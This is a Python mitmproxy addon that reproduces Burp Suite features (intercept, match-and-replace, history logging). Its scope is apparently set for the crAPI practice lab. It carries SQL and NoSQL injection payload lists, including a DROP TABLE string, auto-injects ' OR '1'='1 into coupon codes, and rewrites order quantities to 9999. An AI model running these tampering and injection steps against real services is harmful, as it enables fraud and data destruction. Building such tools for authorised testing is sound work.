"""
Comprehensive mitmproxy addon that replicates key Burp Suite features:
- Proxy/Intercept
- Repeater (via replay)
- Intruder (via scripted fuzzing)
- History logging
- Match & Replace

Usage:
    mitmdump -p 8082 -s burp_equivalent.py
"""

import mitmproxy.http
from mitmproxy import ctx
import json
import re
import time
import os


class BurpEquivalent:
    def __init__(self):
        # === SCOPE (like Burp's Target Scope) ===
        self.in_scope = [
            r"crapi\.apisec\.ai",
            r"localhost:8888",
            r"target\.com",
        ]

        # === INTERCEPT RULES (like Burp's Intercept) ===
        self.intercept_enabled = True
        self.intercept_rules = [
            {"url": r"/api/shop/apply_coupon", "action": "modify"},
            {"url": r"/api/auth/login", "action": "log"},
        ]

        # === MATCH & REPLACE (like Burp's Match & Replace) ===
        self.match_replace = [
            # Request body replacements
            {
                "type": "request_body",
                "match": r'"quantity":\s*(\d+)',
                "replace": '"quantity": 9999',
            },
            # Header replacements
            {
                "type": "request_header",
                "match": r"User-Agent: .*",
                "replace": "User-Agent: HackerBot/1.0",
            },
        ]

        # === HISTORY (like Burp's HTTP History) ===
        self.history = []
        self.history_file = "/tmp/proxy_history.json"

        # === INTRUDER PAYLOADS ===
        self.sql_payloads = [
            "'",
            "' OR '1'='1",
            "'; DROP TABLE users;--",
            "' UNION SELECT NULL--",
        ]
        self.nosql_payloads = ['{"$gt":""}', '{"$ne":""}', '{"$regex":".*"}']

    def is_in_scope(self, url):
        return any(re.search(p, url) for p in self.in_scope)

    def apply_match_replace(self, flow):
        """Apply match & replace rules"""
        for rule in self.match_replace:
            if rule["type"] == "request_body" and flow.request.content:
                content = flow.request.content.decode("utf-8", errors="ignore")
                new_content = re.sub(rule["match"], rule["replace"], content)
                if new_content != content:
                    flow.request.content = new_content.encode()
                    ctx.log.warn(f"[MATCH&REPLACE] Body modified")

            elif rule["type"] == "request_header":
                for name, value in flow.request.headers.items():
                    if re.search(rule["match"], f"{name}: {value}"):
                        ctx.log.info(f"[MATCH&REPLACE] Header matched: {name}")

    def request(self, flow: mitmproxy.http.HTTPFlow):
        url = flow.request.pretty_url

        if not self.is_in_scope(url):
            return

        # Log to history
        entry = {
            "id": len(self.history) + 1,
            "time": time.strftime("%Y-%m-%d %H:%M:%S"),
            "method": flow.request.method,
            "url": url,
            "headers": dict(flow.request.headers),
            "body": flow.request.content.decode("utf-8", errors="ignore")
            if flow.request.content
            else None,
        }
        self.history.append(entry)

        # Apply match & replace
        self.apply_match_replace(flow)

        # Check intercept rules
        for rule in self.intercept_rules:
            if re.search(rule["url"], url):
                if rule["action"] == "modify":
                    ctx.log.warn(f"[INTERCEPT] {flow.request.method} {url}")
                    # Auto-modification example
                    if flow.request.content:
                        try:
                            body = json.loads(flow.request.content)
                            # Example: Auto-inject SQL payload for testing
                            if "coupon_code" in body:
                                body["coupon_code"] = (
                                    body["coupon_code"] + "' OR '1'='1"
                                )
                                flow.request.content = json.dumps(body).encode()
                                ctx.log.warn(f"  Injected SQL payload")
                        except:
                            pass
                elif rule["action"] == "log":
                    ctx.log.info(f"[LOG] {flow.request.method} {url}")

    def response(self, flow: mitmproxy.http.HTTPFlow):
        url = flow.request.pretty_url

        if not self.is_in_scope(url):
            return

        # Update history with response
        for entry in reversed(self.history):
            if entry["url"] == url and "response" not in entry:
                entry["response"] = {
                    "status": flow.response.status_code,
                    "headers": dict(flow.response.headers),
                    "body_preview": flow.response.content[:500].decode(
                        "utf-8", errors="ignore"
                    )
                    if flow.response.content
                    else None,
                }
                break

        # Save history periodically
        if len(self.history) % 10 == 0:
            self.save_history()

        ctx.log.info(f"[RESPONSE] {flow.response.status_code} {url}")

    def save_history(self):
        with open(self.history_file, "w") as f:
            json.dump(self.history, f, indent=2)
        ctx.log.info(
            f"[HISTORY] Saved {len(self.history)} entries to {self.history_file}"
        )

    def done(self):
        self.save_history()


addons = [BurpEquivalent()]
